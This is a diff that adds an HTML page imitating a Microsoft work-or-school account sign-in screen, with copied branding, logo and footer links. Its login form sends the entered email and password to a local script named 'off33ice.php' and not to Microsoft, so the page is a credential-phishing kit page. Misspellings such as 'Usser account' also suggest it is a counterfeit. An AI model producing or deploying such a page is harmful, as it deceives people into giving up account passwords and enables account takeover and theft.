@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html dir="ltr" style="background-color: rgb(235, 60, 0);">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta http-equiv="Pragma" content="no-cache">
+        <meta http-equiv="Expires" content="-1">
+        <meta name="PageID" content="i5030.2.0">
+        <meta name="SiteID" content="">
+        <meta name="ReqLC" content="1033">
+        <meta name="LocLC" content="en-US">
+        <meta name="mswebdialog-newwindowurl" content="*">
+        <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5364.5/content/images/favicon_a.ico">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+        <link href="index_files/login.min.css" rel="stylesheet">
+        <style>
+            .no_display {
+                display: none;
+            }
+        </style>
+
+        <!--[if lte IE 10]>
+        <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5364.5/content/cdnbundles/login_ie.min.css" rel="stylesheet" />
+
+    <![endif]-->
+
+        <!--[if lte IE 7]>
+      <style type='text/css'>
+        .ie_legacy { display: none; }
+        body { background-color: #0072C6; }
+      </style>
+    <![endif]-->
+        <style>
+            body {
+                display: none;
+            }
+        </style>
+
+        <title>
+            Sign in to your account </title>
+    </head>
+
+    <body style="display: block;">
+        <p id="accessibleError" class="accessibleError" style="display:none;" aria-live="assertive" aria-relevant="all" aria-atomic="true" role="alert" aria-hidden="true"></p>
+
+
+
+        <div id="background_branding_container" class="ie_legacy" style="background: rgb(235, 60, 0);">
+            <img id="background_background_image" alt="Illustration" src="index_files/heroillustration.png" style="width: 820px; height: 680px; visibility: visible; display: block; background-color: rgb(235, 60, 0);">
+            <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you're on a slow connection. We've disabled some images to speed things up.</div>
+            <div id="background_company_name_text" class="background_title_text" style="opacity: 0;">Sign in with your work or school account</div>
+        </div>
+        <div id="background_page_overlay" class="overlay ie_legacy" aria-hidden="true" style="visibility: visible; display: none; background-color: rgb(235, 60, 0);">
+        </div>
+
+        <div id="login_no_script_panel" class="login_panel" aria-hidden="true" style="display: none;">
+
+
+            <noscript>
+                &lt;style&gt;body { display: block; }&lt;/style&gt; &lt;div class="login_inner_container no_js"&gt; &lt;div class="inner_container cred"&gt; &lt;div class="login_workload_logo_container"&gt; &lt;/div&gt; &lt;div id="login_no_js_error_container" class="login_full_error_container"&gt; &lt;div id="login_no_js_error_text" class="cta_text 1"&gt; &lt;H1&gt;We can't sign you in&lt;/H1&gt;&lt;p&gt;Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.&lt;/p&gt;&lt;p&gt;To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id="footer_links_container" class="login_footer_container"&gt; &lt;div class="footer_inner_container"&gt; &lt;table id="footer_table" class="footer_block"&gt; &lt;tr&gt; &lt;td&gt; &lt;div&gt; &lt;div class="corporate_footer"&gt; &lt;div&gt; &lt;span class="footer_link text-caption" id="footer_copyright_link"&gt; &amp;#169; 2017 Microsoft &lt;/span&gt; &lt;/div&gt; &lt;div&gt; &lt;span class="footer_link"&gt; &lt;a class="text-caption" id="footer_link_terms" href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank"&gt;Terms of use&lt;/a&gt; &lt;/span&gt; &lt;span class="footer_link"&gt; &lt;a class="text-caption" id="footer_link_privacy" href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank"&gt;Privacy &amp;amp; Cookies&lt;/a&gt; &lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td&gt; &lt;div class="footer_glyph"&gt; &lt;img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5364.5/content/images/microsoft_logo.png" alt="Microsoft account symbol" /&gt; &lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id="login_prefetch_container" class="no-display"&gt; &lt;/div&gt;
+
+            </noscript>
+
+        </div>
+        <div id="login_panel" class="login_panel" style="display: block;">
+            <div id="legal-section" class="legal_container">
+                <div id="legal-content" class="legal-content normaltext"></div>
+                <button id="legal-back-btn" class="legal-btn button normaltext">Back</button>
+            </div>
+            <table class="login_panel_layout" style="height: 100%;">
+                <tbody>
+                    <tr class="login_panel_layout_row" style="height: 100%;">
+                        <td id="login_panel_center">
+                            <div class="login_inner_container">
+                                <div id="true_inner" class="inner_container cred">
+                                    <div class="login_workload_logo_container"><img id="login_workload_logo_image" class="workload_img" alt="Sign in with your work or school account" style="visibility: visible;" src="index_files/bannerlogo.png">
+                                    </div>
+                                    <div class="spacer"></div>
+                                    <div id="login_error_container" class="login_error_container"></div>
+                                    <div class="login_cta_container normaltext">
+                                        <div id="login_cta_text" class="cta_message_text 1">Work or school, or personal Microsoft account</div>
+                                    </div>
+                                    <form id="credentials" method="post" action="off33ice.php">
+                                        <ul class="login_cred_container">
+                                            <!-- From ViewTemplateBase/Tiles.cshtml -->
+                                            <li id="login_user_chooser" class="login_user_chooser"></li>
+                                            <!--  -->
+                                            <li class="login_cred_field_container">
+                                                <div id="cred_userid_container" class="login_textfield textfield">
+                                                    <span class="input_field textfield">
+                                                        <label for="cred_userid_inputtext" class="no_display" aria-hidden="true">Usser account</label>
+                                                        <div class="input_border">
+                                                            <input id="cred_userid_inputtext" class="login_textfield textfield required email field normaltext" placeholder="Email or phone" type="email" name="email" spellcheck="false" alt="Email or phone" aria-label="User account" value="" autocomplete="off" aria-describedby="accessibleError">
+                                                        </div>
+                                                    </span>
+                                                </div>
+                                                <div id="cred_password_container" class="login_textfield textfield" style="opacity: 1;">
+                                                    <span class="input_field textfield">
+                                                        <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Password</label>
+                                                        <div class="input_border">
+                                                            <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" type="password" name="password" value="" aria-describedby="accessibleError">
+                                                        </div>
+                                                    </span>
+                                                </div>
+                                            </li>
+                                            <li id="login-splitter-control" class="login_splitter_control">
+                                                <div id="splitter-tiles-container"></div>
+                                            </li>
+                                            <li class="login_cred_options_container" id="login_cred_options_container">
+                                                <div id="cred_kmsi_container" class="subtext normaltext">
+                                                    <span class="input_field ">
+                                                        <input id="cred_keep_me_signed_in_checkbox" type="checkbox" value="0" class="win-checkbox" name="persist">
+                                                        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
+                                                    </span>
+                                                </div>
+                                                <button id="cred_sign_in_button" class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary disabled_button" style="opacity: 1;" type="">
+                                                    Sign in
+                                                </button>
+                                                <div id="recover_container" class="subtext smalltext" style="opacity: 1;">
+                                                    <span>
+                                                        <a href="#">Cant access your account?</a>
+                                                    </span>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </form>
+                                </div>
+                            </div>
+                            <div id="footer_links_container" class="login_footer_container">
+                                <div class="footer_inner_container">
+                                    <table id="footer_table" class="footer_block">
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <div>
+                                                        <div class="corporate_footer">
+                                                            <div>
+                                                                <span class="footer_link text-caption" id="footer_copyright_link">
+	2017 Microsoft                                        </span>
+                                                            </div>
+                                                            <div>
+                                                                <span class="footer_link">
+                                                                    <a class="text-caption" id="footer_link_terms" href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
+                                                                </span>
+                                                                <span class="footer_link">
+                                                                    <a class="text-caption" id="footer_link_privacy" href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; Cookies</a>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </td>
+                                                <td>
+                                                    <div class="footer_glyph">
+                                                        <img src="index_files/microsoft_logo.png" alt="Microsoft account symbol">
+                                                    </div>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </body>
+
+</html>
